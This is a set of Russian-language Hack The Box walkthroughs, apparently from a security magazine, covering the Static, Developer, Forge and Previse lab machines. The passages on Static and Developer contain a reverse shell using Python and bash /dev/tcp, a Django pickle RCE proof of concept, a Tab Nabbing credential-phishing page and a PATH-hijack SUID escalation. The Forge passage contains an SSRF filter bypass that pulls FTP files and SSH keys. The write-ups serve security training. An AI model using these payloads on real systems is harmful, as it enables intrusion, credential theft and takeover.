а мы принимаем и таким образом подключаемся к ней, чтобы выполнять
команды от лица пользователя, который запустил шелл. Для приема соеди‐
нения необходимо создать на локальной машине  listener, то есть «слу‐
шатель».



Листенер придется открывать на «прокси‑хосте», поэтому загрузим на него
netcat.


scp -P2222 -i id_rsa ~/tools/linStaticbins/ncat www-data@static.htb:/
tmp/ncat
chmod +x /tmp/ncat
/tmp/ncat

После  того  как  листенер  будет  активирован,  передадим  следующий
реверс‑шелл в качестве значения параметра a через браузер. Это поможет
обойтись без всяких кодировок нагрузки.


python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect(("192.168.254.2",4321));subprocess.
call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.
fileno())'





Почти мгновенно получим бэкконнект.


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Запускаем через веб‑приложение и пробуем найти еще что‑нибудь связан‐
ное с ним.


find / -name *ersatool* 2>/dev/null



                            Поиск файлов ersatool

Мы нашли исходники приложения. Я скопировал их и открыл в VS Code
для более удобного анализа. Сразу после старта функция main проверяет
аргументы. Самая интересная из команд — create. Она приводит к вызову
функции createCN (строки 253–254).





                Исходный код приложения — функция main

В этой функции выполняется запрос поля CN (строки 99-102), а затем исполь‐
зуется rasyrsa для генерирования сертификата (строки 94-96, ++114-117).++
Вот только в приложении контекста работы программы меняется на привиле‐
гированный (строка 123) перед выполнением функции system (строка 125).





              Исходный код приложения — функция createCN

Я решил  просмотреть  все  действия,  которые  происходят  в  системе
при генерировании сертификата. Проблема была лишь в загрузке файлов,
так как в системе нет ни curl, ни wget. Но есть Python! Так, на первом «прок‐
си‑хосте» я поместил файл с содержимым testtest и запустил веб‑сервер
командой python3 -m http.server 8000. А затем использовал следующий
скрипт для получения этого файла.


python3 -c 'import urllib.request; response = urllib.request.urlopen(
"http://192.168.254.2:8000/test.sh"); data = response.read() ; text
= data.decode("utf-8"); print(text)'



                                Загрузка файла

Теперь загрузим на «прокси‑хост» pspy — приложение для мониторинга
запускаемых в системе процессов.


scp -P2222 -i id_rsa ./pspy64 www-data@static.htb:/home/www-data/
pspy64

Затем закодируем его в Base64, чтобы не потерять никакие данные при заг‐
рузке через Python.


base64 -w0 pspy64 > pspy64.b64

Следом на целевом хосте загрузим файл с закодированным в Base64 содер‐
жимым, декодируем, дадим права на выполнение и запустим.


python3 -c 'import urllib.request; response = urllib.request.urlopen(
"http://192.168.254.2:8000/pspy64.b64"); data = response.read() ;
text = data.decode("utf-8"); print(text)' > pspy64.b64
cat pspy64.b64 | base64 -d > pspy64
chmod +x pspy64
./pspy64

А теперь в другом окне запустим тестируемое приложение и создадим сер‐
тификат.





                         Создание сертификата

После окончания работы просмотрим логи pspy. Рассматриваем каждую
команду, которая была выполнена во время работы тестируемого приложе‐
ния.





                                    Логи pspy

Среди выполненных программ обнаружим запуск OpenSSL. Использованный
способ ее вызова уязвим, так как путь к исполняемому файлу указан не абсо‐
лютный. Таким образом, в ход вступает переменная среды окружения PATH.
Система будет искать файл openssl по порядку в каждой директории, указан‐
ной в этой переменной.
  Мы можем создать файл с именем openssl, содержащий любые команды.
Мы добавим его каталог в переменную PATH так, чтобы эта директория была
первой в списке. Тогда при вызове OpenSSL из нашего приложения получим
выполнение наших команд в привилегированном контексте!
  В качестве выполняемой нагрузки используем установку бита SUID файлу
командной оболочки bash.


echo '#!/bin/bash' > openssl
echo 'chmod u+s /bin/bash' >> openssl
chmod 777 openssl





                  Создание фиктивного файла OpenSSL


Справка: бит SUID
Когда у файла установлен атрибут setuid (S-атрибут), обычный пользователь,
запускающий этот файл, получает повышение прав до пользователя — вла‐
дельца файла в рамках запущенного процесса. После получения повышенных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю. Из‑за возможности состояния гонки многие операционные
системы игнорируют S-атрибут, установленный shell-скриптами.


Теперь изменим переменную PATH, указав в ней текущую директорию.


export PATH=/tmp/ralf:$PATH



                        Перезапись переменной PATH

Сгенерируем сертификат. После чего проверим, установлен ли S-бит файлу
bash.




                         Генерирование сертификата





                       Проверка прав на файл /bin/bash

Получилось! Теперь просто запустим bash.


python3 -c 'import pty; pty.spawn("/bin/bash")'
/bin/bash -p





                           Флаг рута

Мы захватили полный контроль над машиной и забрали флаг рута.
ВЗЛОМ

        HTB
DEVELOPER





      ЛОМАЕМ САЙТ НА DJANGO
      И РЕВЕРСИМ ПРИЛОЖЕНИЕ
              НА RUST





В этой статье я покажу, как взламывают
сайты на Django. Кроме того, мы снимем
пароль с файла XLS и применим фишин‐
говую атаку Tab Nabbing. Для повышения
привилегий разберем алгоритм программы             RalfHacker                                                                                             hackerralf8@gmail.com
на Rust. Все это — чтобы пройти сложную
машину  Developer  с   площадки  Hack
The Box.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА. СКАНИРОВАНИЕ ПОРТОВ
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.103    developer.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Находим два открытых порта: 22, на котором работает SSH, и 80, отвечающий
за веб.

Справка: брутфорс учеток
Поскольку вначале у нас нет учетных данных, нет и смысла изучать службы,
которые всегда требуют авторизации (например, SSH). Единственное, что мы
можем делать здесь, — это перебирать пароли брутфорсом, но у машин
с HTB почти всегда есть другое прохождение. В жизни таких вариантов может
не быть, к тому же имеются шансы подобрать пароль или получить его
при помощи социальной инженерии.


Начинаем, конечно же, с веба!





                           Главная страница сайта

Нас встречает сайт какой‑то CTF-площадки. Просмотрев его содержимое,
обнаружим возможность регистрации и авторизации, но, что примечательно,
нет ни одного файла на PHP. Возможно, это фреймворк на Python? Чтобы
проверить догадку, просканируем скрытые директории в корневом каталоге
сайта.

Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске указываем сле‐
дующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из результата ответы с кодом 403.



Команда получается следующая:


ffuf -u http://developer.htb/FUZZ -t 256 -w directory_2.3_medium_
lowercase.txt





                        Результат сканирования каталогов

В выводе будет очень много каталогов, которые возвращают код 301 —
редирект. Если перейти по любому из них, то нас встретит админка фрей‐
мворка Django.





                        Панель авторизации Django

Больше ничего не найдя, регистрируемся на первом сайте.





                        Главная панель пользователя

На самом сайте лежит по два‑три таска из разных категорий, но мой интерес
привлекла страница с настройками профиля пользователя. Сканируем тек‐
стовые поля, но это не дает результата. Может, попробуем сдать любой
из тасков? Это может открыть что‑то новое. Я решил просмотреть задание
на форензику phished_credentials. Как сказано в условии задания, где‑то
в файле есть пароль.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
      HTB DEVELOPER
            ЛОМАЕМ САЙТ НА DJANGO И РЕВЕРСИМ
                         ПРИЛОЖЕНИЕ НА RUST





ТОЧКА ВХОДА
XLS sheet protect unlock
Открываем файл и видим скрытый столбец E. Раздвинуть столбцы не выходит,
так как лист документа защищен паролем от изменения.





               Содержимое документа phished_credentials.xls

Но такую защиту можно легко снять. Откроем как архив и найдем в нем нас‐
тройки для нужного листа. Так как тут он только один, нам нужен файл
sheet1.xml.





                          Содержимое архива

В  этом  файле  найдем  и  удалим  следующую   строку.  Это  поле
sheetProtection.


<sheetProtection algorithmName="SHA-512" hashValue=
"Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/
E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==" saltValue="EoiHQklf0FagPs+iW0OzkA=="
spinCount="100000" sheet="1" objects="1" scenarios="1"/>





                            Поле sheetProtection

Пересохранив файл и открыв документ, обнаруживаем, что защиты больше
нет. Раздвигаем столбец E и получаем флаг для площадки.





                        Флаг для задания

Осталось передать его в форму на сайте.





                                 Отправка флага

После обновления страницы ее вид немного меняется, вместо кнопки сдачи
ответа появляется кнопка отправки решения.





                           Страница челленджа

Причем не через загрузку файла, а указывается URL страницы.





                      Форма загрузки решения


Tab Nabbing
Я открыл локальный веб‑сервер Python 3 (команда python3 -m http.server
80) и отправил ссылку http://10.10.14.59/writeup.html. В логах веб‑сер‐
вера видим обращение к указанной странице. Это место для теста!


                               Логи веб‑сервера

Ко всему прочему решение отображается на странице профиля.





                    Профиль текущего пользователя

Вот только если попытаться просмотреть его, оно откроется в новой вкладке.
В исходном коде страницы находим атрибут target="_blank" в теге <a>.





                         Исходный код страницы

Когда аргумент href тега <a> с атрибутом target="_blank" нам подконтро‐
лен и целевой пользователь может перейти по ссылке, есть шанс указать там
фишинговый сайт. Как только пользователь нажмет ссылку, с помощью объ‐
екта window.opener мы перенаправляем его на наш вредоносный ресурс,
который будет содержать клон легитимной страницы авторизации. Это дол‐
жно заставить пользователя вбить свои учетные данные. Эта техника фишин‐
га называется Tab Nabbing.
   Создадим в каталоге веб‑сервера файл writeup.html со следующим
содержимым.


<html>
<script>
if (window.opener) window.opener.parent.location.replace('http://10.
10.14.59/login.html');
if (window.parent != window) window.parent.location.replace('http://
10.10.14.59/login.html');
</script>
</html>

Этот код должен открыть страницу login.html на нашем сервере. Теперь
клонируем страницу авторизации на сайте. Для этого я использую рас‐
ширение SingleFile для браузера Firefox, позволяющее сохранить всю стра‐
ницу в едином HTML-файле.
   Сохраним файл как login.html и немного изменим его код. Указываем
атрибуты action="auth.php" и method="get".





                   Исходный код фишинговой страницы

Теперь снова отправим решение задания и в логах веб‑сервера увидим его
запрос, затем перенаправление на login.html и отправку учетных данных
на auth.php.



                               Логи веб‑сервера

Эти учетные данные позволяют авторизоваться в админке Django.





                     Панель администрирования Django




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
      HTB DEVELOPER
            ЛОМАЕМ САЙТ НА DJANGO И РЕВЕРСИМ
                         ПРИЛОЖЕНИЕ НА RUST





ТОЧКА ОПОРЫ
Пройдемся по разделам, чтобы извлечь всю полезную информацию. Тут мы
можем получить список пользователей и сайтов.





                          Список пользователей





                              Список сайтов

Так как мы получили новое доменное имя, сразу добавим его в /etc/hosts.
Теперь наша запись будет выглядеть так:


10 .10 .11 .103    developer .htb developer -sentry.developer .htb

А на самом сайте Sentry нас встретит форма авторизации.





                      Форма авторизации Sentry

У нас есть пароль администратора одного сервиса, высока вероятность, что
этот пароль подойдет и тут. Вопрос лишь в имени пользователя. Логин admin
оказался  неверным; если  вписать  полную  почту admin@developer.htb
или admin@developer.ctf, тоже ничего не получаем. Но у администратора
указано имя James. Пробуем почту james@developer.htb и получаем доступ
к сайту.





                           Главная страница сайта

Внизу видим номер версии Sentry — 8.0.0. Это не самая новая, поэтому стоит
поискать готовые эксплоиты. Так Google приводит нас на Exploit-DB, а точ‐
нее — к эксплоиту для версии 8.2.0.





                              Поиск эксплоитов

Эксплоит отрабатывает, но ничего не дает.


python3 50318.py --url 'http://developer-sentry.developer.htb' -U
'jacob@developer.htb' -P 'SuperSecurePassword@HTB2021' -l 10.10.14.
59 -p 4321





                               Запуск эксплоита

Поэтому пробуем вручную.


Sentry RCE
Sentry использует модуль pickle, нужный для сериализации и десериализации
данных Python. Это может помочь добиться выполнения кода, но сначала нам
нужен секретный ключ Django. Его можно получить, создав и удалив проект:
Create Project → Add Project → Save Project → Project Setting → Remove Project.





                            Create New Project





                          Configure your application





                                 Project settings





                        Remove project

И мы получим нужные конфигурации. Пролистаем до пункта SENTRY_OPTIONS
и сохраним секретный ключ (параметр system.secret-key).





                       Параметры SENTRY_OPTIONS

Имея секретный ключ, мы можем использовать следующий PoC для создания
и сериализации объекта, который выполнит нужный нам код. Все, что нужно
в нем изменить, — это значения SECRET_KEY и cookie. В качестве нагрузки
используем реверс‑шелл /bin/bash -c "bash -i >& /dev/tcp/10.10.14.
59/4321 0>&1".


#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import cPickle
import os


SECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'
cookie='.
eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQoZRBnmmGUlB
bq7FhVFcAEFSlKLS5Lz87MzU8FayvOLslNTQoXiE0tLMuJLi1OL4pMSk7NT81JClSDG6Z
WWZOYU64Hk9VxzEzNzHIEsJ6gaXiR9mSnerKV6AOVwM6Y:
1n8lto:4YBeYgMOt1ujubTsANFkmRr3fw4'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,
serializer=django.contrib.sessions.serializers.PickleSerializer,salt=
'django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
   def __reduce__(self):
       return (os.system,('/bin/bash -c "bash -i >& /dev/tcp/10.10.
14.59/4321 0>&1"',))
newContent['testcookie'] = PickleRce()


print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=
django.contrib.sessions.serializers.PickleSerializer,salt='django.
contrib.sessions.backends.signed_cookies',compress=True)




                         Создание новых cookie

Активируем на своем локальном хосте листенер.

Справка: реверс-шелл
Обратный шелл — это подключение, которое активирует атакуемая машина,
а мы принимаем и таким образом подключаемся к ней, чтобы выполнять
команды от лица пользователя, который запустил шелл. Для приема соеди‐
нения необходимо создать на локальной машине  listener, то есть «слу‐
шатель».
  В таких случаях пригодится rlwrap — readline-оболочка, которая в числе
прочего позволяет пользоваться историей команд. Она обычно доступна
в репозитории дистрибутива.


 sudo apt install rlwrap


В качестве самого листенера при этом можно использовать широко извес‐
тный netcat.


Команда будет следующей:


rlwrap -cAr nc -lvnp 4321

Вставляем новые cookie, обновляем страницу и в окне листенера получаем
бэкконнект.





                             Получение бэкконекта




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
      HTB DEVELOPER
            ЛОМАЕМ САЙТ НА DJANGO И РЕВЕРСИМ
                         ПРИЛОЖЕНИЕ НА RUST





ПРОДВИЖЕНИЕ
Первым делом получаем удобную TTY-оболочку с помощью Python:


python -c 'import pty;pty.spawn("/bin/bash")'

При продвижении самый вероятный способ сменить рабочий контекст —
это авторизоваться от имени другого пользователя. Так как у нас даже два
сайта на хосте, нам стоит поискать учетные данные в их базах. Прежде чем
шерстить базу, найдем учетные данные для подключения к этой базе. В слу‐
чае с первым сайтом это файл /var/www/developer_ctf/developer_ctf/
settings.py.





                     Список файлов сайта developer_ctf





                      Содержимое файла settings.py

Теперь подключимся к базе c помощью psql — утилиты командной строки
для работы с PostgreSQL.


psql postgresql://ctf_admin:CTFOG2021@localhost:5432/platform

После подключения взглянем на список таблиц, для этого используется
команда \dt.





                              Список таблиц

Нас интересует таблица auth_user, из которой получим логины и пароли.


select username,password from auth_user;





             Учетные данные пользователей сайта Developer CTF

Но с этими учетными данными нигде залогиниться не получилось. Тогда изу‐
чим Sentry. Настройки для подключения к базе данных хранятся в файле
/etc/sentry/sentry.conf.py.





                    Содержимое файла sentry.conf.py

Опять подключаемся к базе и просматриваем существующие таблицы.


psql postgresql://sentry:SentryPassword2021@localhost:5432/sentry
\d t





                              Список таблиц

Вновь получаем учетные данные из таблицы auth_user.


select username,password from auth_user;




                     Учетные данные платформы Sentry

Сохраняем хеши в файл и отправляем на перебор с помощью hashcat.


hashcat -m 10000 hashes.txt rockyou.txt



                             Результат перебора хешей

Спустя несколько минут мы получаем один пароль, с которым удается авто‐
ризоваться по SSH.


                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Первым делом проверяем наиболее вероятные места повышения привиле‐
гий. Это могут быть настройки sudoers, приложения с битом SUID, прос‐
лушиваемые на локальном хосте порты. Нам везет с sudoers.

Справка: sudoers
Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
пользователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи команды sudo -l.





                              Настройки судоера

В настройках sudoers прописан привилегированный запуск пользовательско‐
го приложения /root/.auth/authenticator. Узнаем тип файла с помощью
утилиты file.


                         Просмотр типа файла

Это исполняемый файл, который при запуске попросит пароль. Скачиваем
файл на локальный хост:


scp karl@developer.htb:/root/.auth/authenticator ./

Закидываем его для анализа в любой удобный дизассемблер. На этот раз я
решил попробовать Ghidra.


             INFO

                        Подробнее о Ghidra:
                  •«Ghidra vs IDA Pro. На что способен бесплатный
                                тулкит для реверса, созданный в АНБ»
                  •«Ghidra vs crackme. Обкатываем конкурента IDA
                           Pro на примере решения хитрой крэкми с VM»


При поиске функции main я понял, что программа написана на языке Rust,
а это усложняет анализ.





                             Поиск функции main

Открываем в декомпиляторе найденную функцию authentication::main и в
ней находим точку, где запрашивается пароль.





                 Псевдокод запроса пароля пользователя

Чуть ниже находим использование шифрования (crypto::aes::ctr), а имен‐
но алгоритм AES, режим CTR.





                      Блок шифрования строки

И еще ниже видим сообщение об успешной аутентификации.





                   Блок кода после проверки пароля

Таким образом, введенная нами строка будет сравниваться с прообразом
сохраненных в программе зашифрованных данных. Попробуем найти все
параметры, необходимые для шифрования (строка, ключ, вектор инициали‐
зации), и расшифровать пароль. Из документации узнаем аргументы функции
crypto::aes::ctr.





                    Описание функции crypto::aes::ctr

То есть сначала передается ключ, а потом вектор инициализации. Изменив
имена переменных, легко найдем их в коде.





                      Блок шифрования данных

А нужная нам строка сохранена в переменной __ptr. Используя все данные
и суперинструмент CyberChef, мы можем расшифровать данные и пароль.





                    Расшифровка данных из программы

Используем этот пароль в приложении. Проверка пройдена, нас просят ука‐
зать ключ SSH (генерируем командой ssh-keygen).





                     Эксплуатация приложения authenticator

Теперь мы можем авторизоваться с приватным ключом и забрать флаг рута.



                           Флаг рута

Мы захватили машину и имеем над ней полный контроль!
ВЗЛОМ

      HTB
 FORGE





        ЭКСПЛУАТИРУЕМ SSRF
     ДЛЯ ДОСТУПА К КРИТИЧЕСКОЙ
          ИНФОРМАЦИИ





Сегодня мы с тобой пройдем среднюю
по сложности машину с площадки Hack
The Box под названием Forge. Проэксплу‐
атируем уязвимость SSRF в форме  заг‐
рузки  файлов  и  через  эту  уязвимость             RalfHacker                                                                                             hackerralf8@gmail.com
получим данные с локального FTP-сервера.
А осложнять все это будут фильтры адресов
на стороне сервера.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА. СКАНИРОВАНИЕ ПОРТОВ
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.111    forge.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).



#!/bin/bash
ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
tr '\n' ',' | sed s/,$/ /)
nmap -p$ports -A $1





                             Результат работы скрипта

Мы нашли три открытых порта, один из которых фильтруется:
 • порт 21 — служба FTP (фильтруется);
 • порт 22 — служба OpenSSH 8.2p1;
 • порт 80 — веб‑сервер Apache 2.4.1.

Так как FTP недоступен, а SSH пробивать смысла нет, переходим к тес‐
тированию сайта на веб‑сервере. Первым делом осмотримся в поиске точек
входа.





                           Главная страница сайта

Нас встречает галерея. В верхнем правом углу сайта находим ссылку на фор‐
му загрузки файлов. Файл можно загрузить на сервер двумя путями: нап‐
рямую и через URL.





                   Форма загрузки файлов напрямую





                  Форма загрузки файлов через URL

Первая мысль — загрузить шелл. Но сервер принимает только картинки,
и выполнить вставку кода не получилось. В сервисах, где файлы загружаются
через URL, стоит проверить наличие уязвимости SSRF.

Справка: SSRF
SSRF — это атака на сервер, в результате которой злоумышленник получает
возможность отправлять запросы от имени скомпрометированного хоста.
SSRF может быть использована в DoS-кампаниях для маскировки реального
источника атаки. В таких случаях уязвимый хост выступает в качестве прок‐
си‑сервера.


Для теста SSRF указываем адрес 127.0.0.1. Но получаем сообщение о том,
что запрос заблокирован, так как URL включен в черный список.





                        Сообщение о блокировке

Тогда возникла идея поискать другие точки — просканировать сайт на пред‐
мет скрытого контента.

Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске указываем сле‐
дующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из результата ответы с кодом 403.




ffuf -u http://forge.htb/FUZZ -fc 403 -t 300 -w directory_2.3_medium.
txt




                        Результат сканирования каталогов

Среди каталогов ничего нового не нашли. Тогда просканируем поддомены.
Это может открыть новые сайты для атаки. Используем тот же ffuf, а переби‐
рать будем значение заголовка HOST.


ffuf -u http://forge.htb/ -H "Host: FUZZ.forge.htb" -fc 302 -t 300 -w
 subdomains-top1million-110000.txt



                       Результат сканирования поддоменов

Находим новый сайт, который добавляем в файл /etc/hosts:


10.10.11.111    admin.forge.htb

Правда, он доступен только для обращения с локального хоста.




                Ответ сервера при обращении к admin.forge.htb


ТОЧКА ВХОДА
Так как больше ничего интересного не нашли, нужно пытаться пробить SSRF.
Поэтому попробуем разные способы указания локального хоста и переберем
с помощью Burp Intruder. Перехватываем запрос в Burp Proxy и перенап‐
равляем в Intruder. На вкладке Payload Positions выбираем адрес 127.0.0.1.





                    Burp Intruder — вкладка Positions

На вкладке Options зададим правило извлечения из ответа данных. Для этого
выбираем нужную строку (в данном случае — сообщение о блокировке)
и отмечаем галочку Extract from regex group. Это поможет автоматически соб‐
рать регулярное выражение для интересующей нас строки.





                             Настройка Extract Grep

Количество потоков можно выставить на свой выбор, я использовал 256.
Списки способов для указания локального хоста есть на GitHub и легко гуг‐
лятся. Когда все готово, запускаем атаку. Результат получаем уже через нес‐
колько секунд.





                     Результаты сканирования Burp Intruder

В дополнительной колонке, куда попали сообщения от сервера, находим сре‐
ди прочего отчеты об успешной загрузке. Используя средство просмотра
ответа Render, можно посмотреть эту страницу, не выходя из Burp.





                       Ответ сервера в Response Render

Видим, что в случае успешной загрузки «файла» нам дают на него ссылку.
Перейдя по этой ссылке, найдем там стартовую страницу галереи. Таким
образом, присутствует уязвимость SSRF!





             Ответ сервера при обращении к загруженному файлу

Теперь выясним, по каким протоколам мы можем работать через такой рет‐
ранслятор. Для этого отправляем наш «успешный» запрос в Burp Intruder и на
вкладке Payload Positions выбираем действующий протокол.





                    Burp Intruder — вкладка Positions

В список заносим самые вероятные протоколы и запускаем перебор.





                       Результат сканирования Burp Intruder

В итоге сервер поддерживает всего два протокола: HTTP (работает) и HTTPS
(выдает ошибку, так как на сервере закрыт порт 443). Остальные протоколы
были отфильтрованы. Мы получаем все больше информации, но пока ничего
существенного. Стоит помнить про административный сервис, обращение
к которому должно происходить через доменное имя. Попробуем обратиться
к основному домену и любому его поддомену, даже несуществующему.





                  Тестирование доменного имени forge.htb





             Тестирование доменного имени 1232erwe.forge.htb

В обоих случаях получаем сообщение про черный список. Скорее всего, сто‐
ит проверка вхождения последовательности forge.htb. Попробуем обмануть
предполагаемую политику и изменить регистр символов — fOrge.htb.





                  Тестирование доменного имени fOrge.htb

И получаем ссылку на страницу. Этим способом получим ссылку и на копию
административного сервиса.





               Тестирование доменного имени admin.fOrge.htb


ТОЧКА ОПОРЫ
Запрашиваем сохраненную страницу и получаем другую ссылку.





                Полученный код административной страницы

Повторяем всю процедуру заново, но теперь в качестве конечной точки ука‐
зываем только полученную ссылку. Это позволит нам раскрыть еще больше
информации о сервисах.





             Код страницы admin.fOrge.htb/announcements

Мы получаем учетные данные для входа по FTP. Также узнаем о странице
/upload, которая принимает параметр u, где нужно передать URL. А среди
поддерживаемых протоколов присутствуют FTP и SFTP. Давай обратимся
к этой странице и передадим в качестве URL адрес локального FTP-сервера:


admin.fOrge.htb/upload?u=ftp://user:heightofsecurity123!@127.1.1.1





                     Запрос данных по FTP через SSRF



                        Содержимое FTP-сервера

Это похоже на пользовательскую директорию. Попробуем получить содер‐
жимое скрытого каталога .ssh.





                        Содержимое каталога .ssh

Получаем приватный ключ и подключаемся по SSH.





                        Приватный ключ пользователя




                       Флаг пользователя

Так мы захватываем пользователя и получаем стабильный доступ.


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Одна из первых вещей, которые нужно проверять в Linux, когда ищешь спо‐
собы поднять привилегии, — это файл sudoers. Смотрим его.

Справка: sudoers
Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
пользователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи команды sudo -l.





                              Настройки судоера

В настройках sudoers прописан привилегированный запуск пользовательско‐
го скрипта /opt/remote-manage.py без ввода пароля (NOPASSWD). Прос‐
мотрим содержимое файла.
   Этот скрипт открывает указанный порт (строка 12), запрашивает сек‐
ретный пароль и проверяет его (строки 16–20). Затем скрипт запрашивает
у подключенного пользователя цифру от 1 до 4 для выполнения соответству‐
ющего действия (строки 22–36). Но если во время выполнения кода произой‐
дет ошибка, то обработчик исключения передаст управление pdb — отладчи‐
ку Python (строки 37–39).





                Содержимое файла /opt/remote-manage.py

Таким образом, если мы сможем вызвать ошибку в приложении, то сможем
получить консоль отладчика. Это позволит выполнять свой код в привиле‐
гированном режиме.
   Вызвать ошибку в приложении можно в строке 27, где введенная строка
преобруется к целочисленному значению. Запустим приложение, подключим‐
ся к нему со второго терминала с помощью netcat.



                              Запуск приложения





                      Подключение к открытому порту

Теперь вводим любую строку, при этом в терминале самого приложения
отобразится ошибка и появится консоль pdb.





                    Вызов исключения приведения типа

Теперь импортируем модуль PTY и получаем командную оболочку в высокоп‐
ривилегированном режиме.





                           Флаг рута

Мы захватили очередную машину и имеем полный контроль над ней!
ВЗЛОМ

       HTB
 PREVISE





   РАСКРУЧИВАЕМ КРИВОЙ РЕДИРЕКТ
     ДО ПОЛНОГО ЗАХВАТА САЙТА





Сегодня на примере легкой машины с пло‐
щадки Hack The Box я покажу вполне типич‐
ный процесс захвата веб‑сервера. Начнем
с  неправильно  настроенного  редиректа,
получим  доступ  к  закрытым  страницам,             RalfHacker                                                                                             hackerralf8@gmail.com
а точку опоры найдем через форму получе‐
ния  логов.  Захватить  флаг  рута  нам
поможет ошибка в скрипте пользователя.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.104    writer.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Находим два открытых порта: 22 (служба OpenSSH 7.6p1) и 80 (веб‑сервер
Apache 2.4.29). SSH пока пропустим.

Справка: брутфорс учеток
Поскольку в начале прохождения у нас нет учетных данных, нет и смысла изу‐
чать службы, которые всегда требуют авторизации (например, SSH). Единс‐
твенное, что мы можем делать здесь, — это перебирать пароли брутфорсом,
но у машин с HTB почти всегда есть другое прохождение. В жизни таких вари‐
антов может не быть, к тому же есть шансы подобрать пароль или получить
его при помощи социальной инженерии.


Остается «пробивать» веб. Внимательно изучим сайт в поисках любой важной
информации. При загрузке сайта http://previse.htb нас перебрасывают
на страницу login.php. Там нас встречает форма авторизации.





                         Форма авторизации

Незаменимое средство при анализе веб‑сайтов — набор программ Burp
Pro. Например, входящий в него Burp Proxy при анализе сайта ведет свою
историю запросов и ответов. Там мы можем найти наш редирект. Но что
более удивительно, редирект выполнен неправильно, так как страница сна‐
чала загружается, а потом происходит перенаправление. Увидеть главную
страницу можно во встроенном  браузере  Burp. Для  этого  активируем
Response → Render.





                    Главная страница сайта в Burp Render

